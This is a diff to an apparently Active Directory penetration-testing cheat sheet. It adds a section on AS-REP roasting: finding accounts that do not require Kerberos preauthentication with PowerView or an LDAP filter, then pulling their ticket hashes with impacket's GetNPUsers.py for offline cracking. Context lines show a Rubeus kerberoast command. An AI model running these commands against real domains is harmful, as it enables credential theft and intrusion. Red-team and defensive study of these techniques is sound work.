@@ -88,6 +88,8 @@
     
         <li><a class="" href="#kerberosunconstraineddelegation">KerberosUnConstrainedDelegation</a></li>
     
+        <li><a class="" href="#kerberos-preauthentication">Kerberos preauthentication</a></li>
+    
         <li><a class="" href="#collect-ad-users-information">Collect AD users information</a></li>
     
         <li><a class="" href="#decrypt-gpo-with-cpassword">Decrypt GPO with cpassword</a></li>
@@ -325,6 +327,21 @@ if we want to use bitwise in ldap queries, we need to use some special arguments
 <pre><code class="language-bash">Rubeus.exe kerberoast /creduser:&quot;&lt;fqdn_dom&gt;\&lt;user&gt;&quot; /credpassword:&quot;&lt;password&gt;&quot; /domain:&quot;&lt;fqdn_dom&gt;&quot; /outfile:&quot;kerberoast.hash.txt&quot;
 </code></pre>
 
+<h3 id="kerberos-preauthentication">Kerberos preauthentication</h3>
+<p>A domain user can have the property "Do net required Kerberos preauthentication".
+In this configuration, it's possible to ask to the KDC a TGT that is signed with
+the user password. So the clear password can be retrieve with a brute-force attack.</p>
+<p>The goal is to list the users that have this settings enable:</p>
+<ul>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/445f7b2510c4553dcd9451bc4daccb20c8e67cbb/Recon/PowerView.ps1" target="_blank">Powerview</a> : <code>Get-DomainUser -PreauthNotRequired</code></li>
+<li>LDAP: <code>userAccountControl:1.2.840.113556.1.4.803:=4194304</code></li>
+</ul>
+<p>Then you can use the <code>impacket</code> script <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" target="_blank"><code>GetNPUsers.py</code></a>
+to get the TGT in a format the <code>John</code> or <code>Hashcat</code> can brute-force:</p>
+<pre><code class="language-bash">python GetNPUsers.py &lt;domain&gt;/ -usersfile users.txt -format &lt;john/empty&gt; -outputfile hashes.txt
+</code></pre>
+
+<p>From <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" target="_blank">@harmj0y</a>.</p>
 <h3 id="collect-ad-users-information">Collect AD users information</h3>
 <pre><code class="language-powerhsell"># Helping functions
 function Get-ADUserDirectoryEntry($user) {
